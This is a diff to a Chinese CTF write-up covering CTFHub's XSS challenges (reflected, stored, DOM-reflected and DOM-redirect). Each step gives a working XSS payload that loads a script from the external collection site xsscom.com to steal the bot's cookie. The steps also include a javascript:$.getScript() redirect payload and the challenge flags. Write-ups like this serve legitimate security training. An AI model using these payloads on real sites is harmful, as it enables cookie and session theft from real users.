@@ -1254,9 +1254,57 @@ ctfhub{f90b6c76f97124cd83e38e9b}
 利用 [xsscom](http://xsscom.com/) 来获取与靶机的交互信息，新建项目、默认模块、无keepsession。
 
 > #### What's your name 后的输入框填写 CTFHub 点击Submit
-Send URL to Bot中URL后的输入框填写`http://challenge-f218d4eec3b4f897.sandbox.ctfhub.com:10800/?name=</textarea>'"><script src=http://xsscom.com//purFOq></script>` 点击Send
+#### Send URL to Bot中URL后的输入框填写`http://challenge-f218d4eec3b4f897.sandbox.ctfhub.com:10800/?name=</textarea>'"><script src=http://xsscom.com//purFOq></script>` 点击Send
 
 在接收到的内容中能看到`cookie : flag=ctfhub{c7f04cd9f2e9912994ba8f6b}`，提交即可。
+
+------
+
+#### 存储型
+
+利用 [xsscom](http://xsscom.com/) 来获取与靶机的交互信息，新建项目、默认模块、无keepsession。
+
+> #### What's your name 后的输入框填写 `</textarea>'"><script src=http://xsscom.com//purFOq></script>` 点击Submit
+#### Send URL to Bot中URL后的输入框填写`http://challenge-c41534fe7b97ead5.sandbox.ctfhub.com:10800/?name=</textarea>'"><script src=http://xsscom.com//purFOq></script>` 点击Send
+
+在接收到的内容中能看到`cookie : flag=ctfhub{3815ce26ba81106c87aeafb2}`，提交即可。
+
+------
+
+#### DOM反射
+
+利用 [xsscom](http://xsscom.com/) 来获取与靶机的交互信息，新建项目、默认模块、无keepsession。
+
+> #### CHange text 后的输入框填写 `';</script></textarea>'"><script src=http://xsscom.com//purFOq></script>` 点击Submit
+>
+> #### Send URL to Bot中URL后的输入框填写`http://challenge-80649bd4ea91be99.sandbox.ctfhub.com:10800/?text=</textarea>'"><script src=http://xsscom.com//purFOq></script>` 点击Send
+
+在接收到的内容中能看到`cookie : flag=ctfhub{f9a1ed96d100cf595700f32d}`，提交即可。
+
+------
+
+#### DOM跳转
+
+进入网站，直接查看源代码，下面是关键代码，这里有`XSS`漏洞：
+
+```html
+<script>
+    var target = location.search.split("=")
+    if (target[0].slice(1) == "jumpto") 
+        location.href = target[1];
+    }
+</script>
+```
+
+这段代码的作用是从当前页面的`URL`中通过`GET`方式获取查询字符串，如果参数名为`jumpto`，则将页面重定向到参数值所指定的`URL`。
+
+利用 [xsscom](http://xsscom.com/) 来获取与靶机的交互信息，新建项目、默认模块、无keepsession。
+
+> #### JumpTo 后的输入框并不能填写内容
+>
+> #### Send URL to Bot中URL后的输入框填写`http://challenge-859ced9cb2ed32a5.sandbox.ctfhub.com:10800?jumpto=javascript:$.getScript("//xsscom.com//purFOq")` 点击Send
+
+用`jQuery` 的 `$.getScript()` 函数来异步加载并执行来自 [xsscom](http://xsscom.com/) 的 `JavaScript` 脚本，通过`jumpto=javascript:$.getScript()`，在接收到的内容中能看到`cookie : flag=ctfhub{b9ae823a620388be4477a939}`，提交即可。
 
 ------
 
